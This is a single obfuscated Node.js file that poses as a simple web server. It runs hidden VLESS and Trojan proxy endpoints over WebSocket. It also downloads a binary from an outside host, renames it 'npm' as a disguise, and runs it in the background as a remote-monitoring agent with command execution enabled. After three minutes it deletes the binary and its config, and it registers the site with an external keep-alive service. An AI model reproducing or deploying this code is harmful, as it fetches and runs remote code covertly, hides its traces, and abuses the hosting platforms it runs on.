const os = require('\x6f\x73');const http = require('\x68\x74\x74\x70');const fs = require('\x66\x73');const axios = require('\x61\x78\x69\x6f\x73');const net = require('\x6e\x65\x74');const path = require('\x70\x61\x74\x68');const crypto = require('\x63\x72\x79\x70\x74\x6f');const { Buffer } = require('\x62\x75\x66\x66\x65\x72');const { exec, execSync } = require('\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73');const { WebSocket, createWebSocketStream } = require('\x77\x73');const UUID = process["\x65\x6e\x76"]["\x55\x55\x49\x44"] || '\x38\x65\x65\x62\x38\x34\x37\x32\x2d\x33\x61\x30\x30\x2d\x34\x30\x62\x64\x2d\x61\x38\x33\x36\x2d\x30\x33\x32\x62\x30\x62\x63\x61\x64\x61\x61\x32'; const NEZHA_SERVER = process["\x65\x6e\x76"]["\x4e\x45\x5a\x48\x41\x5f\x53\x45\x52\x56\x45\x52"] || '';       const NEZHA_PORT = process["\x65\x6e\x76"]["\x4e\x45\x5a\x48\x41\x5f\x50\x4f\x52\x54"] || '';           const NEZHA_KEY = process["\x65\x6e\x76"]["\x4e\x45\x5a\x48\x41\x5f\x4b\x45\x59"] || '';                      const DOMAIN = process["\x65\x6e\x76"]["\x44\x4f\x4d\x41\x49\x4e"] || '';       const AUTO_ACCESS = process["\x65\x6e\x76"]["\x41\x55\x54\x4f\x5f\x41\x43\x43\x45\x53\x53"] || true;       const WSPATH = process["\x65\x6e\x76"]["\x57\x53\x50\x41\x54\x48"] || UUID["\x73\x6c\x69\x63\x65"](0, 8);     const SUB_PATH = process["\x65\x6e\x76"]["\x53\x55\x42\x5f\x50\x41\x54\x48"] || '\x73\x75\x62';            const NAME = process["\x65\x6e\x76"]["\x4e\x41\x4d\x45"] || '';                       const PORT = process["\x65\x6e\x76"]["\x50\x4f\x52\x54"] || 7860;                     let ISP = '';const GetISP = async () => {  try {    const res = await axios["\x67\x65\x74"]('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x69\x70\x2e\x73\x62\x2f\x67\x65\x6f\x69\x70');    const data = res["\x64\x61\x74\x61"];    ISP = `${data["\x63\x6f\x75\x6e\x74\x72\x79\x5f\x63\x6f\x64\x65"]}-${data["\x69\x73\x70"]}`["\x72\x65\x70\x6c\x61\x63\x65"](/ /g, '\x5f');  } catch (e) {    ISP = '\x55\x6e\x6b\x6e\x6f\x77\x6e';  }}GetISP();const httpServer = http["\x63\x72\x65\x61\x74\x65\x53\x65\x72\x76\x65\x72"]((req, res) => {  if (req["\x75\x72\x6c"] === '\x2f') {    const filePath = path["\x6a\x6f\x69\x6e"](__dirname, '\x69\x6e\x64\x65\x78\x2e\x68\x74\x6d\x6c');    fs["\x72\x65\x61\x64\x46\x69\x6c\x65"](filePath, '\x75\x74\x66\x38', (err, content) => {      if (err) {        res["\x77\x72\x69\x74\x65\x48\x65\x61\x64"](200, { '\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65': '\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c' });        res["\x65\x6e\x64"]('\x48\x65\x6c\x6c\x6f \x77\x6f\x72\x6c\x64\x21');        return;      }      res["\x77\x72\x69\x74\x65\x48\x65\x61\x64"](200, { '\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65': '\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c' });      res["\x65\x6e\x64"](content);    });    return;  } else if (req["\x75\x72\x6c"] === `/${SUB_PATH}`) {    const namePart = NAME ? `${NAME}-${ISP}` : ISP;    const vlessURL = `vless://${UUID}@${DOMAIN}:443?encryption=none&security=tls&sni=${DOMAIN}&fp=chrome&type=ws&host=${DOMAIN}&path=%2F${WSPATH}#${namePart}`;    const trojanURL = `trojan://${UUID}@${DOMAIN}:443?security=tls&sni=${DOMAIN}&fp=chrome&type=ws&host=${DOMAIN}&path=%2F${WSPATH}#${namePart}`;    const subscription = vlessURL + '\n' + trojanURL;    const base64Content = Buffer.from(subscription).toString('base64');        res.writeHead(200, { 'Content-Type': 'text/plain' });    res.end(base64Content + '\n');  } else {    res.writeHead(404, { 'Content-Type': 'text/plain' });    res.end('Not Found\n');  }});const wss = new WebSocket.Server({ server: httpServer });const uuid = UUID.replace(/-/g, "");const DNS_SERVERS = ['8.8.4.4', '1.1.1.1'];// Custom DNSfunction resolveHost(host) {  return new Promise((resolve, reject) => {    if (/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(host)) {      resolve(host);      return;    }    let attempts = 0;    function tryNextDNS() {      if (attempts >= DNS_SERVERS.length) {        reject(new Error(`Failed to resolve ${host} with all DNS servers`));        return;      }      const dnsServer = DNS_SERVERS[attempts];      attempts++;      const dnsQuery = `https://dns.google/resolve?name=${encodeURIComponent(host)}&type=A`;      axios.get(dnsQuery, {        timeout: 5000,        headers: {          'Accept': 'application/dns-json'        }      })      .then(response => {        const data = response.data;        if (data.Status === 0 && data.Answer && data.Answer.length > 0) {          const ip = data.Answer.find(record => record.type === 1);          if (ip) {            resolve(ip.data);            return;          }        }        tryNextDNS();      })      .catch(error => {        tryNextDNS();      });    }        tryNextDNS();  });}// VLE-SS处理function handleVlessConnection(ws, msg) {  const [VERSION] = msg;  const id = msg.slice(1, 17);  if (!id.every((v, i) => v == parseInt(uuid.substr(i * 2, 2), 16))) return false;    let i = msg.slice(17, 18).readUInt8() + 19;  const port = msg.slice(i, i += 2).readUInt16BE(0);  const ATYP = msg.slice(i, i += 1).readUInt8();  const host = ATYP == 1 ? msg.slice(i, i += 4).join('.') :    (ATYP == 2 ? new TextDecoder().decode(msg.slice(i + 1, i += 1 + msg.slice(i, i + 1).readUInt8())) :    (ATYP == 3 ? msg.slice(i, i += 16).reduce((s, b, i, a) => (i % 2 ? s.concat(a.slice(i - 1, i + 1)) : s), []).map(b => b.readUInt16BE(0).toString(16)).join(':') : ''));  ws.send(new Uint8Array([VERSION, 0]));  const duplex = createWebSocketStream(ws);  resolveHost(host)    .then(resolvedIP => {      net.connect({ host: resolvedIP, port }, function() {        this.write(msg.slice(i));        duplex.on('error', () => {}).pipe(this).on('error', () => {}).pipe(duplex);      }).on('error', () => {});    })    .catch(error => {      net.connect({ host, port }, function() {        this.write(msg.slice(i));        duplex.on('error', () => {}).pipe(this).on('error', () => {}).pipe(duplex);      }).on('error', () => {});    });    return true;}// Tro-jan处理function handleTrojanConnection(ws, msg) {  try {    if (msg.length < 58) return false;    const receivedPasswordHash = msg.slice(0, 56).toString();    const possiblePasswords = [      UUID,    ];        let matchedPassword = null;    for (const pwd of possiblePasswords) {      const hash = crypto.createHash('sha224').update(pwd).digest('hex');      if (hash === receivedPasswordHash) {        matchedPassword = pwd;        break;      }    }        if (!matchedPassword) return false;    let offset = 56;    if (msg[offset] === 0x0d && msg[offset + 1] === 0x0a) {      offset += 2;    }        const cmd = msg[offset];    if (cmd !== 0x01) return false;    offset += 1;    const atyp = msg[offset];    offset += 1;    let host, port;    if (atyp === 0x01) {      host = msg.slice(offset, offset + 4).join('.');      offset += 4;    } else if (atyp === 0x03) {      const hostLen = msg[offset];      offset += 1;      host = msg.slice(offset, offset + hostLen).toString();      offset += hostLen;    } else if (atyp === 0x04) {      host = msg.slice(offset, offset + 16).reduce((s, b, i, a) =>         (i % 2 ? s.concat(a.slice(i - 1, i + 1)) : s), [])        .map(b => b.readUInt16BE(0).toString(16)).join(':');      offset += 16;    } else {      return false;    }        port = msg.readUInt16BE(offset);    offset += 2;        if (offset < msg.length && msg[offset] === 0x0d && msg[offset + 1] === 0x0a) {      offset += 2;    }        const duplex = createWebSocketStream(ws);    resolveHost(host)      .then(resolvedIP => {        net.connect({ host: resolvedIP, port }, function() {          if (offset < msg.length) {            this.write(msg.slice(offset));          }          duplex.on('error', () => {}).pipe(this).on('error', () => {}).pipe(duplex);        }).on('error', () => {});      })      .catch(error => {        net.connect({ host, port }, function() {          if (offset < msg.length) {            this.write(msg.slice(offset));          }          duplex.on('error', () => {}).pipe(this).on('error', () => {}).pipe(duplex);        }).on('error', () => {});      });        return true;  } catch (error) {    return false;  }}// Ws 连接处理wss.on('connection', (ws, req) => {  const url = req.url || '';  ws.once('message', msg => {    if (msg.length > 17 && msg[0] === 0) {      const id = msg.slice(1, 17);      const isVless = id.every((v, i) => v == parseInt(uuid.substr(i * 2, 2), 16));      if (isVless) {        if (!handleVlessConnection(ws, msg)) {          ws.close();        }        return;      }    }    if (!handleTrojanConnection(ws, msg)) {      ws.close();    }  }).on('error', () => {});});const getDownloadUrl = () => {  const arch = os.arch();   if (arch === 'arm' || arch === 'arm64' || arch === 'aarch64') {    if (!NEZHA_PORT) {      return 'https://arm64.ssss.nyc.mn/v1';    } else {      return 'https://arm64.ssss.nyc.mn/agent';    }  } else {    if (!NEZHA_PORT) {      return 'https://amd64.ssss.nyc.mn/v1';    } else {      return 'https://amd64.ssss.nyc.mn/agent';    }  }};const downloadFile = async () => {  if (!NEZHA_SERVER && !NEZHA_KEY) return;    try {    const url = getDownloadUrl();    const response = await axios({      method: 'get',      url: url,      responseType: 'stream'    });    const writer = fs.createWriteStream('npm');    response.data.pipe(writer);    return new Promise((resolve, reject) => {      writer.on('finish', () => {        console.log('npm download successfully');        exec('chmod +x npm', (err) => {          if (err) reject(err);          resolve();        });      });      writer.on('error', reject);    });  } catch (err) {    throw err;  }};const runnz = async () => {  try {    const status = execSync('ps aux | grep -v "grep" | grep "./[n]pm"', { encoding: 'utf-8' });    if (status.trim() !== '') {      console.log('npm is already running, skip running...');      return;    }  } catch (e) {    // 进程不存在时继续运行nezha  }  await downloadFile();  let command = '';  let tlsPorts = ['443', '8443', '2096', '2087', '2083', '2053'];    if (NEZHA_SERVER && NEZHA_PORT && NEZHA_KEY) {    const NEZHA_TLS = tlsPorts.includes(NEZHA_PORT) ? '--tls' : '';    command = `setsid nohup ./npm -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${NEZHA_TLS} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`;  } else if (NEZHA_SERVER && NEZHA_KEY) {    if (!NEZHA_PORT) {      const port = NEZHA_SERVER.includes(':') ? NEZHA_SERVER.split(':').pop() : '';      const NZ_TLS = tlsPorts.includes(port) ? 'true' : 'false';      const configYaml = `client_secret: ${NEZHA_KEY}debug: falsedisable_auto_update: truedisable_command_execute: falsedisable_force_update: truedisable_nat: falsedisable_send_query: falsegpu: falseinsecure_tls: trueip_report_period: 1800report_delay: 4server: ${NEZHA_SERVER}skip_connection_count: trueskip_procs_count: truetemperature: falsetls: ${NZ_TLS}use_gitee_to_upgrade: falseuse_ipv6_country_code: falseuuid: ${UUID}`;            fs.writeFileSync('config.yaml', configYaml);    }    command = `setsid nohup ./npm -c config.yaml >/dev/null 2>&1 &`;  } else {    console.log('NEZHA variable is empty, skip running');    return;  }  try {    exec(command, { shell: '/bin/bash' }, (err) => {      if (err) console.error('npm running error:', err);      else console.log('npm is running');    });  } catch (error) {    console.error(`error: ${error}`);  }   }; async function addAccessTask() {  if (!AUTO_ACCESS) return;  if (!DOMAIN) {    return;  }  const fullURL = `https://${DOMAIN}`;  try {    const res = await axios.post("https://oooo.serv00.net/add-url", {      url: fullURL    }, {      headers: {        'Content-Type': 'application/json'      }    });    console.log('Automatic Access Task added successfully');  } catch (error) {    // console.error('Error adding Task:', error.message);  }}const delFiles = () => {  fs.unlink('npm', () => {});  fs.unlink('config.yaml', () => {}); };httpServer.listen(PORT, () => {  runnz();  setTimeout(() => {    delFiles();  }, 180000);  addAccessTask();  console.log(`Server is running on port ${PORT}`);});
